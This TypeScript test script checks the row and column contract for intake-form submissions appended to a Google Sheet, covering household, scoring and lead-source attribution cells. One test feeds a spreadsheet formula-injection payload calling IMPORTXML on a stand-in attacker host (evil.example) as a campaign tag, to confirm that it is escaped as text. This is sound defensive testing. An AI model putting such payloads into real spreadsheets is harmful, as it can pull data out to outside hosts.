// Run from project root: npx tsx src/scripts/test-intake-row.ts
// Pins the /api/intake Google Sheet row shape (src/lib/intakeRow.ts):
// 17 columns, headers in the frozen order, and cell values for a wizard
// submission; the household block (18–22) and the lead-source block (23–29)
// appended after them. Exits non-zero on any failure. If this test has to
// change, the column contract changed — that needs an explicit owner decision.

import {
  INTAKE_HEADERS,
  INTAKE_HOUSEHOLD_HEADERS,
  INTAKE_HOUSEHOLD_ALL_HEADERS,
  INTAKE_LEAD_SOURCE_HEADERS,
  INTAKE_ALL_HEADERS,
  INTAKE_APPEND_RANGE_COLUMNS,
  INTAKE_APPEND_RANGE_ALL,
  buildIntakeRow,
  buildIntakeHouseholdCells,
  buildIntakeLeadSourceCells,
  intakeAvailabilitySlots,
  intakeHeaderPatch,
  sheetColumnLetter,
} from "../lib/intakeRow";

let failures = 0;

function check(name: string, actual: unknown, expected: unknown) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) {
    console.log(`  ✓ ${name}`);
  } else {
    failures++;
    console.error(`  ✗ ${name}\n      expected ${e}\n      got      ${a}`);
  }
}

// ─── Header contract ──────────────────────────────────────────────────────────

console.log("headers");
check("17 columns", INTAKE_HEADERS.length, 17);
check("frozen order (1–14) + additive (15–17)", [...INTAKE_HEADERS], [
  "timestamp", "name", "email", "phone", "who", "level",
  "goals", "programs", "area", "notes", "newsletter",
  "priority_score", "lead_type", "follow_up_status",
  "preferred_locations", "availability", "recommended_program",
]);
check("append range covers A–Q", INTAKE_APPEND_RANGE_COLUMNS, "A:Q");

// ─── Appended household block (cols 18–22, backlog #11) ──────────────────────

console.log("household headers");
check("5 appended columns", INTAKE_HOUSEHOLD_HEADERS.length, 5);
check("appended in order", [...INTAKE_HOUSEHOLD_HEADERS], [
  "account_email", "account_name", "participant_name",
  "participant_relationship", "participant_id",
]);
check("22 columns before the lead-source block", INTAKE_HOUSEHOLD_ALL_HEADERS.length, 22);
check(
  "the frozen 17 are still the first 17 of the full header row",
  INTAKE_ALL_HEADERS.slice(0, 17),
  [...INTAKE_HEADERS]
);

// ─── Appended lead-source block (cols 23–29, backlog #26) ─────────────────────

console.log("lead-source headers");
check("7 appended columns", INTAKE_LEAD_SOURCE_HEADERS.length, 7);
check("appended in order", [...INTAKE_LEAD_SOURCE_HEADERS], [
  "source", "medium", "campaign", "content", "click_id", "landing_page", "first_seen",
]);
check("29 columns in total", INTAKE_ALL_HEADERS.length, 29);
check(
  "columns 1–22 of the full header row are byte-identical to the pre-#26 row",
  INTAKE_ALL_HEADERS.slice(0, 22),
  [
    "timestamp", "name", "email", "phone", "who", "level",
    "goals", "programs", "area", "notes", "newsletter",
    "priority_score", "lead_type", "follow_up_status",
    "preferred_locations", "availability", "recommended_program",
    "account_email", "account_name", "participant_name",
    "participant_relationship", "participant_id",
  ]
);
check("full append range covers A–AC", INTAKE_APPEND_RANGE_ALL, "A:AC");
check("column letters", [0, 16, 21, 22, 25, 28].map(sheetColumnLetter), ["A", "Q", "V", "W", "Z", "AC"]);

// The route's header-row check: extend, never rewrite what is already right.
console.log("header patch");
const PRE_26_HEADERS = INTAKE_ALL_HEADERS.slice(0, 22);
check(
  "an empty tab gets the whole header row from A1",
  intakeHeaderPatch([]),
  { range: "A1", values: [...INTAKE_ALL_HEADERS] }
);
check(
  "a tab with the 22 pre-#26 headers gets only W1:AC1 — columns 1–22 untouched",
  intakeHeaderPatch(PRE_26_HEADERS),
  { range: "W1", values: [...INTAKE_LEAD_SOURCE_HEADERS] }
);
check(
  "a complete header row is left alone",
  intakeHeaderPatch([...INTAKE_ALL_HEADERS]),
  null
);
check(
  "a complete row with extra owner columns after AC is left alone",
  intakeHeaderPatch([...INTAKE_ALL_HEADERS, "owner_notes"]),
  null
);
check(
  "a tab with only the frozen 17 is extended from R1",
  intakeHeaderPatch(INTAKE_ALL_HEADERS.slice(0, 17))?.range,
  "R1"
);

// ─── Wizard submission (what src/app/intake/page.tsx sends today) ─────────────

console.log("wizard row");
const TS = "2026-09-08T14:00:00.000Z";
const wizard = {
  who: "adult",
  level: "rally",
  goals: [],
  programs: [],
  preferredLocationIds: ["balliol", "king"],
  availability: { days: { mon: ["eve"], wed: ["mor", "eve"], sat: ["aft"] }, v: 1 },
  notes: "",
  name: "Jordan Lee",
  phone: "(647) 555-1234",
  email: "jordan@example.com",
  newsletter: true,
  area: "balliol, king",
  recommendedProgram: "bootcamps",
};
const row = buildIntakeRow(wizard, TS);
check("row has 17 cells", row.length, 17);
check("row matches the frozen contract cell for cell", row, [
  TS,
  "Jordan Lee",
  "jordan@example.com",
  "(647) 555-1234",
  "adult",
  "rally",
  "",                       // goals (not collected)
  "",                       // programs (not collected)
  "balliol, king",          // area (legacy col 9)
  "",                       // notes
  "yes",                    // newsletter
  "1",                      // priority_score
  "standard",               // lead_type
  "new",                    // follow_up_status
  "balliol, king",          // preferred_locations
  "v1:mon:eve;wed:mor,eve;sat:aft", // availability (compact v1 string)
  "bootcamps",              // recommended_program
]);
check("row cells line up with headers", row.length, INTAKE_HEADERS.length);

// ─── Scoring branches ─────────────────────────────────────────────────────────

console.log("scoring");
const elite = buildIntakeRow({ ...wizard, level: "elite" }, TS);
check("elite → priority 3 / lead_type elite", [elite[11], elite[12]], ["3", "elite"]);

const highIntent = buildIntakeRow({ ...wizard, programs: ["bootcamp", "private"] }, TS);
check("private program → priority 2 / high-intent", [highIntent[11], highIntent[12]], ["2", "high-intent"]);

const multi = buildIntakeRow({ ...wizard, programs: ["bootcamp", "group"] }, TS);
check("two programs → priority 2 / high-intent", [multi[11], multi[12]], ["2", "high-intent"]);

// ─── Legacy + edge shapes ─────────────────────────────────────────────────────

console.log("legacy and edge shapes");
const legacy = buildIntakeRow(
  { ...wizard, availability: ["weekday-evening", "weekend-morning"], area: undefined },
  TS
);
check("legacy slot array joins with ', '", legacy[15], "weekday-evening, weekend-morning");
check("area falls back to preferredLocationIds", legacy[8], "balliol, king");

const empty = buildIntakeRow({}, TS);
check("empty body still yields 17 cells", empty.length, 17);
check("empty body defaults", empty, [
  TS, "", "", "", "", "", "", "", "", "", "", "1", "standard", "new", "", "", "",
]);

const noNewsletter = buildIntakeRow({ ...wizard, newsletter: false }, TS);
check("newsletter false → 'no'", noNewsletter[10], "no");
const unsetNewsletter = buildIntakeRow({ ...wizard, newsletter: undefined }, TS);
check("newsletter unset → ''", unsetNewsletter[10], "");

check(
  "recommender slots derived from the grid",
  intakeAvailabilitySlots(wizard).sort(),
  ["weekday-daytime", "weekday-evening", "weekend-afternoon"]
);

// ─── Household rows (the frozen 17 must not move) ────────────────────────────

console.log("household rows");
const HOUSEHOLD = {
  accountEmail: "dana@example.com",
  accountName: "Dana Chen",
  participantName: "Maya Chen",
  participantRelationship: "child",
  participantId: "11111111-2222-3333-4444-555555555555",
};
const childRow = buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, HOUSEHOLD);
check("household row has 22 cells", childRow.length, 22);
check(
  "cells 1–17 are byte-identical to the frozen contract",
  childRow.slice(0, 17),
  buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS)
);
check("cells 18–22 carry the household", childRow.slice(17), [
  "dana@example.com",
  "Dana Chen",
  "Maya Chen",
  "child",
  "11111111-2222-3333-4444-555555555555",
]);

// A second player under the same account: same account columns, different
// participant — this is what makes two identical names distinguishable.
const siblingRow = buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, {
  ...HOUSEHOLD,
  participantId: "99999999-8888-7777-6666-555555555555",
});
check(
  "two players share the account email",
  [childRow[17], siblingRow[17]],
  ["dana@example.com", "dana@example.com"]
);
check(
  "identical names are still distinguishable by participant_id",
  childRow[21] === siblingRow[21],
  false
);

// Each player answers their own age and level (backlog #14), so cols 5–6
// describe the row's player. The columns themselves do not move.
const junior = buildIntakeRow(
  { ...wizard, name: "Maya Chen", who: "youth", level: "new" },
  TS,
  HOUSEHOLD
);
const teen = buildIntakeRow(
  { ...wizard, name: "Noah Chen", who: "youth", level: "competitive" },
  TS,
  { ...HOUSEHOLD, participantName: "Noah Chen" }
);
check("two players in one household still write 22 cells each",
  [junior.length, teen.length], [22, 22]);
check("each row carries its own who / level",
  [junior[4], junior[5], teen[4], teen[5]],
  ["youth", "new", "youth", "competitive"]);
check(
  "differing who / level never shifts the household block",
  [junior.slice(17, 19), teen.slice(17, 19)],
  [["dana@example.com", "Dana Chen"], ["dana@example.com", "Dana Chen"]]
);

// No household → exactly the pre-#11 row, unchanged.
check(
  "omitting the household yields exactly 17 cells",
  buildIntakeRow(wizard, TS).length,
  17
);
check(
  "an empty household object still defaults from the body",
  buildIntakeHouseholdCells(wizard, {}),
  ["jordan@example.com", "Jordan Lee", "Jordan Lee", "", ""]
);
check(
  "a body with no name or email leaves the household cells blank",
  buildIntakeHouseholdCells({}, {}),
  ["", "", "", "", ""]
);

// ─── Lead-source rows (cols 23–29; the first 22 must not move) ───────────────

console.log("lead-source rows");
const INSTAGRAM = {
  utm_source: "instagram",
  utm_medium: "social",
  utm_campaign: "test",
  landing_path: "/",
  first_seen: "2026-10-08",
};
const taggedRow = buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, HOUSEHOLD, INSTAGRAM);
check("a tagged row has 29 cells", taggedRow.length, 29);
check(
  "cells 1–22 are byte-identical to the pre-#26 household row",
  taggedRow.slice(0, 22),
  buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, HOUSEHOLD)
);
check(
  "cells 23–29: /?utm_source=instagram&utm_medium=social&utm_campaign=test",
  taggedRow.slice(22),
  ["instagram", "social", "test", "", "", "/", "2026-10-08"]
);

const directRow = buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, HOUSEHOLD, null);
check("a direct visit still writes 29 cells", directRow.length, 29);
check(
  "no record → source 'direct', everything else blank",
  directRow.slice(22),
  ["direct", "", "", "", "", "", ""]
);
check(
  "a direct row's first 22 cells equal the tagged row's",
  directRow.slice(0, 22),
  taggedRow.slice(0, 22)
);

check(
  "gclid → click_id 'gclid:…'",
  buildIntakeLeadSourceCells({
    utm_source: "google", utm_medium: "cpc", gclid: "Cj0KCQ", landing_path: "/programs", first_seen: "2026-10-08",
  }),
  ["google", "cpc", "", "", "gclid:Cj0KCQ", "/programs", "2026-10-08"]
);
check(
  "fbclid → click_id 'fbclid:…'; gclid wins when both are present",
  [
    buildIntakeLeadSourceCells({ fbclid: "IwAR1", landing_path: "/", first_seen: "2026-10-08" })[4],
    buildIntakeLeadSourceCells({ gclid: "g1", fbclid: "f1", landing_path: "/", first_seen: "2026-10-08" })[4],
  ],
  ["fbclid:IwAR1", "gclid:g1"]
);
check(
  "an external referrer with no utm_source → source is the referrer's host",
  buildIntakeLeadSourceCells({
    referrer_origin: "https://www.reddit.com", landing_path: "/intake", first_seen: "2026-10-08",
  }),
  ["www.reddit.com", "", "", "", "", "/intake", "2026-10-08"]
);
check(
  "utm_source beats the referrer host",
  buildIntakeLeadSourceCells({
    utm_source: "newsletter", referrer_origin: "https://mail.google.com", landing_path: "/", first_seen: "2026-10-08",
  })[0],
  "newsletter"
);
check(
  "utm_content lands in column 26",
  buildIntakeLeadSourceCells({ utm_source: "ig", utm_content: "reel-3", landing_path: "/", first_seen: "2026-10-08" })[3],
  "reel-3"
);
check(
  "every lead-source cell is a string",
  buildIntakeLeadSourceCells(INSTAGRAM).every((c) => typeof c === "string"),
  true
);
// The append is USER_ENTERED: a formula-leading tag is stored as text, and
// the escape never reaches cells 1–22.
const poisoned = buildIntakeRow(
  { ...wizard, name: "Maya Chen", notes: "=1+1" },
  TS,
  HOUSEHOLD,
  { ...INSTAGRAM, utm_campaign: "=IMPORTXML(\"https://evil.example\",\"//a\")" }
);
check("a formula-leading campaign tag is stored as text", poisoned[24], "'=IMPORTXML(\"https://evil.example\",\"//a\")");
check(
  "cells 1–22 are untouched by the lead-cell escape (notes col 10 is as it always was)",
  poisoned.slice(0, 22),
  buildIntakeRow({ ...wizard, name: "Maya Chen", notes: "=1+1" }, TS, HOUSEHOLD)
);

// Two players, one submission: the same lead block on each row.
const sib1 = buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, HOUSEHOLD, INSTAGRAM);
const sib2 = buildIntakeRow({ ...wizard, name: "Noah Chen" }, TS, { ...HOUSEHOLD, participantName: "Noah Chen" }, INSTAGRAM);
check("both rows carry the lead block", [sib1.slice(22), sib2.slice(22)], [sib1.slice(22), sib1.slice(22)]);

// No lead argument → exactly the pre-#26 row, unchanged.
check("omitting the lead yields exactly 22 cells", buildIntakeRow(wizard, TS, {}).length, 22);
check("omitting household and lead yields exactly 17 cells", buildIntakeRow(wizard, TS).length, 17);

// ─── Result ───────────────────────────────────────────────────────────────────

if (failures > 0) {
  console.error(`\n${failures} check(s) failed`);
  process.exit(1);
}
console.log("\nall checks passed");
